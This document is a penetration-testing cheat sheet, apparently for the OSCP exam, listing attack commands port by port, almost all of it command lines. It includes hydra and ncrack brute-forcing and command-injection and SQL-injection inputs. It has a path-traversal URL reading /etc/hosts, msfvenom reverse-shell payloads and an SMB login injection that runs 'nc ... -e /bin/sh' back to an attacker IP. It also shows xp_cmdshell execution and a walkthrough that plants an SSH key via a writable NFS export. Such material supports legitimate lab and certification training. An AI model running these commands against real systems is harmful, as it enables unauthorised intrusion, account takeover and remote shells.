# OSCP Methodology

Port Scan
---------------

- Discover targets

```
$ netdiscover
```

- Initial TCP Nmap scan

```
$ nmap -sC -sV -oN initial <IP address>
```

- Full TCP Nmap scan

```
$ nmap -sC -sV -A -p- -oN full <IP address>
```

- Full UDP Nmap scan

```
$ nmap -sU -p- -oN udp <IP address>
```

- Nmap NSE vulnerability scan

```
$ nmap <IP address> --script vuln
```

- Start SPARTA to assist with automated scanning & enumeration

```
$ sparta
```

Port 21 (FTP)
---------------

- Anonymous Login/Password Reuse

```
$ ftp <IP address>
OR
FileZilla GUI
OR
ftp://<IP address>
OR
$ telnet <IP address>

Username: ftp Password: ftp
Username: anonymous Password: anonymous
```

- Get/Put files

```
ftp> get file.txt
ftp> put shell.aspx
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "ftp"
```

- Exploit Version

```
$ searchsploit <term>
```

- Brute-Force

```
$ hydra -l root -P password-file.txt <IP address> ftp
OR
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://<IP address>
OR
Sparta GUI
```

Port 22 (SSH)
---------------

- Password Reuse

```
$ ssh <username>@<IP address>
```

- SSH Private Key Login

```
$ chmod 600 private-key.txt
$ ssh -i private-key.txt <username>@<IP address>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "ssh"
```

- Exploit Version

```
$ searchsploit <term>
```

- Brute-Force

```
$ hydra -l root -P password-file.txt <IP address> ssh
OR
Sparta GUI
```

Port 25 (SMTP)
---------------

- Enumerate Users

```
$ for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 <IP address> 25 2>/dev/null | grep ^"250"; done
OR
$ smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP address>
OR
$ smtp-user-enum.pl -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP address>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "smtp"
```

- Exploit Version

```
$ searchsploit <term>
```

Port 53 (DNS)
---------------

- DNS Lookup

```
$ host <IP address/Domain Name>
```

- DNS Name Servers

```
$ host -t ns <Domain Name>
```

- DNS Mail Servers

```
$ host -t mx <Domain Name>
```

- DNS Zone Transfer

```
$ host -l <Domain Name> <DNS server name/IP address>
```

- DNSRecon

```
$ dnsrecon -d <Domain Name> -t axfr
```

- DNSenum

```
$ dnsenum <Domain Name>
```

- Add hostname to /etc/hosts file

```
$ gedit /etc/hosts
10.10.10.29 bank.htb
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "dns"
```

- Exploit Version

```
$ searchsploit <term>
```

Port 69 (udp/TFTP)
------------------

- Connect

```
$ tftp <IP address>
OR
$ atftp <ipaddress>
```

Port 79 (FINGER)
----------------

- Logged in User Enumeration

```
$ finger @<IP address>
```

- User Guessing

```
$ finger <username>@<IP address>
```

- User Enumeration
  
```
$ finger-user-enum.pl -U /usr/share/seclists/usernames/names -t <IP address>
```

Port 80, 443 (HTTP/HTTPS)
--------------------------

- Source Code

```
Right-Click -> View Page Source
```

- Check what request methods a server supports (look for PUT meaning you can upload files)

```
$ curl -v -X OPTIONS <IP address>
```

- Upload a file using curl

```
$ curl http://<IP address> --upload-file test.txt
```

- Non-indexed Webpages

```
http://<IP address>/robots.txt
```

- Investigate the web server

```
http://<IP address>/index.html
http://<IP address>/index.php
```

- Bust Directories

```
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -t 250 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html
OR
$ go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html
OR
$ go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <IP address/URL> -p socks5://127.0.0.1:9050 -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html # Through a socks5 proxy
OR
Dirbuster GUI
OR
$ dirb <IP address/URL> -p socks4://127.0.0.1:9050 # Through a socks4 proxy
```

- ShellShock Directories

```
cgi-bin/user.sh
cgi-bin/test.cgi
```

- Nikto

```
$ nikto -h <IP address>
```

- WPScan

```
$ wpscan --url <WordPress URL> -e u,ap
$ wpscan --url <WordPress URL> -e u,ap,at,cb,dbe
```

- Joomscan

```
$ joomscan -u <Joomla URL> -ec
```

- SSLyze

```
$ sslyze --regular <IP address>
```

- SSLscan

```
$ sslscan <IP address>
```

- DAVTest

```
$ davtest -url http://<IP address>
```

- Burp Suite

```
Preferences -> Advanced -> Network -> Connection Settings -> Manual Proxy Configuration -> Setup Firefox to use proxy 127.0.0.1:8080 -> Turn Intercept to On in Burp -> Right-Click a request and select 'Forward to Repeater'
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "http"
```

- Exploit Version

```
$ searchsploit <term>
```

- Default Password

```
Username: admin Password: admin
Check Google
```

- Command Execution

```
127.0.0.1; uname -a
OR
127.0.0.1 && uname -a
```

- SQL Injection 

```
' or 1=1 #
```

- SQLMAP 

```
$ sqlmap --url=<IP address> --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dbms=mysql --level=3 --risk=3
OR
$ sqlmap --data="search=OSINT" --url=http://192.168.1.160/welcome.php --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dump
```

- SQLMAP .req file (Ippsec)

```
Copy the entire request from Burp
$ vi login.req
Paste the entire request from Burp
$ sqlmap -r login.req
```

- LFI/RFI

```
http://10.11.14.113/addguestbook.php?name=James&comment=Hello&LANG=../../../../../../../../../../etc/hosts
```

- PHP/ASP/ASPX/JSP/WAR Reverse Shell File Upload

```
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Edit IP address and port

$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
```

- Image Data

```
$ exiftool <image>
```

- Brute-Force

```
$ hydra -V -L usernames.txt -P passwords.txt 192.168.1.101 http-get-form '/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security;low;PHPSESSID=1ce2ba52deb9a642ed57a0d34d6c5dfe'
OR
$ hydra -l none -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+Inproc_login=true:Incorrect password" -t 64 -V
OR
$ wpscan --url http://10.11.1.234/wp-login -v -P ~/<wordlist> -U elliot -t 50
```

Port 88 (KERBEROS)
------------------

- Check MS14-068 (if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller)

```
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068
```

Port 110 (POP3)
---------------

Connect and login

```
$ telnet <IP address> 110
USER admin
PASS admin
```

- Display emails

```
LIST
```

- Retrieve email

```
RETR 1
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "pop3"
```

- Exploit Version

```
$ searchsploit <term>
```

Port 111 (RPCBIND)
------------------

- RPC Services

```
$ rpcinfo -p <IP address>
```

Port 135 (MSRPC)
----------------

- Nmap NSE msrpc-enum script

```
$ nmap <IP address> --script=msrpc-enum
```

- Metasploit stack buffer overflow in the RPCSS service

```
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

Port 137, 139, 445 (SAMBA/SMB)
------------------------------

- Automated Enumeration

```
Sparta GUI
```

- Samba/SMB Version

```
$ sudo ./smbver.sh <IP address> <port>
```

- Enum4linux

```
$ enum4linux -a <IP address>
```

- NetBIOS Scan

```
$ nbtscan <IP address>
```

- Rpcclient Null Session

```
$ rpcclient -U "" <IP address>
```

- Smbclient Display Shares

```
$ smbclient -L //<IP address>
```

- Smbclient Connect to a Share

```
$ smbclient //<IP address>/<share>
```

- SMB Reverse Shell (backticks)

```
smb: \> logon "/=`nc <Attacker IP address> <port> -e /bin/sh`"
```

- SMBMap Display Shares

```
$ smbmap -H <IP address>
```

- Psexec

```
$ python psexec.py pentest:'P3nT3st!'@<IP address>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "smb"
OR
$ ls -la /usr/share/nmap/scripts | grep "samba"
```

- Symlink Directory Traversal

```
msf > use auxiliary/admin/smb/samba_symlink_traversal
```

- Exploit Version

```
$ searchsploit <term>
```

- Brute-Force

```
$ hydra -l root -P password-file.txt <IP address> smb
OR
Sparta GUI
```

Port 161 (udp/SNMP)
-------------------

- Onesixtyone Community Strings (Create a community.txt with lines: public, private, manager)

```
$ onesixtyone -c community.txt -i list_of_ips.txt
```

- Snmpwalk entire MIB tree

```
$ snmpwalk -c <community string> -v1 <IP address>
```

- Snmp-check

```
$ snmp-check <IP address>
```

- Snmpcheck

```
$ snmpcheck -c <community string> -t <IP address>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "snmp"
```

- Exploit Version

```
$ searchsploit <term>
```

- Brute-Force

```
$ hydra -P password-file.txt <IP address> snmp
OR
Sparta GUI
```

Port 389/636 (LDAP)
--------------------

- Ldapsearch

```
$ ldapsearch -h <IP address> -p 389 -x -b "dc=mywebsite,dc=com"
```

Port 512 (REXEC)
----------------

- Rlogin (rsh-client)

```
$ rlogin -l root <IP address>
```

- Brute-Force

```
Sparta GUI
```

Port 513 (RLOGIN)
-----------------

- Rlogin (rsh-client)

```
$ rlogin -l root <IP address>
```

- Brute-Force

```
Sparta GUI
```

Port 514 (RSH)
---------------

- Rlogin (rsh-client)

```
$ rlogin -l root <IP address>
```

- Brute-Force

```
Sparta GUI
```

Port 1433 (MSSQL)
-----------------

- Password Reuse

```
mssql-cli -S <server URL> -U <username> -P <password>
```

- Execute commands

```
EXEC xp_cmdshell 'dir *.exe'; 
```

Port 2049 (NFS)
---------------

- NFS Server's All Mount Points List 

```
$ showmount -a 192.168.1.132
```

- NFS Server's Directories List

```
$ showmount -d 192.168.1.132
```

- NFS Server's Export List

```
$ showmount -e 192.168.1.132
Export list for 192.168.1.132:
/home/vulnix *
```

- Mount a remote directory

```
$ mkdir -p /mnt/vulnix
$ mount -t nfs 192.168.1.132:/home/vulnix /mnt/vulnix

Check if you can create .ssh directory (if permission denied, that's okay, follow steps below)
$ mkdir -p /mnt/vulnix/.ssh
```

- Create a fake vulnix account with a UID of 2008 on my machine (Kali Linux)

```
# useradd -u 2008 vulnix
```

- Switch user to vulnix, and create a .ssh directory

```
$ su vulnix
$ cd /mnt/vulnix
$ mkdir .ssh
```

- Switch user to root, and generate a SSH key pair (Kali Linux)

```
$ su root
$ ssh-keygen
$ cat /root/.ssh/id_rsa.pub
```

- Switch user to vulnix, and copy and paste the contents of /root/.ssh/id_rsa.pub to /mnt/vulnix/.ssh/authorized_keys

```
$ su vulnix
$ cd /mnt/vulnix/.ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1rYFvo6Wh4j44p4s6WfDYb637m62zA0CwE5t9K6iKbosZMpeDBGP2q8C2O3yw2P9Dhv3jRPCutf1ruadaMxxiOY8Ook/3fwMcaueCAs0ThKCMRlnf0yzUnEHH7t82MrEghMnL4GfUcYlxIwo8d5jQe7umuJneYK786iDNEPaEajC45GQlrZWCzIWqs3B3vJBQ4FR766EHsmiKVWvQ35uR69/O39IePJQ8oSTF+PK0RoCtvmYt44jeqUO0NfYGeCGwqtYW/i+ILTOkW45bYRVjhmrJ2C+yjtK3bsmDiq28IT9STCFlkI7OqEfJkeYqBSJVqVqOkFFvx4+7fyTpchT/ > authorized_keys
```

- Login to vulnix's accounts via SSH

```
$ su root
$ ssh vulnix@192.168.1.132
```

Port 3306 (MYSQL)
-----------------

- Password Reuse

```
$ mysql -h <IP address> -u <username> -p
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "mysql"
```

- Exploit Version

```
$ searchsploit <term>
```

- Brute-Force

```
Sparta GUI
```

Port 3389 (RDP)
---------------

- Connect

```
$ rdesktop -u <username> -p <password> <IP address>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "rdp"
```

- Brute-Force

```
$ ncrack -vv --user <username> -P password-file.txt rdp://<IP address>
OR
Sparta GUI
```

Port 5432 (POSTGRESQL)
-----------------------

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "postgresql"
```

- Exploit Version

```
$ searchsploit <term>
```

Port 5900 (VNC)
---------------

- Connect

```
$ vncviewer <IP address>:<port> -passwd <password>
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "vnc"
```

Port 5985 (WINRM)
------------------

- Connect

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

Port 6667 (IRC)
---------------

- Determine version

```
$ irssi -c <IP address> --port 6667
```

- Nmap NSE Scripts

```
$ ls -la /usr/share/nmap/scripts | grep "irc"
```

Port 8080 (HTTP-PROXY)
-----------------------

- Configure Firefox to use a proxy

```
Preferences -> Advanced -> Network -> Connection Settings -> Manual Proxy Configuration
```

- Nikto Scan through a proxy

```
$ nikto -h <IP address> -useproxy http://192.168.97.129:3128
```
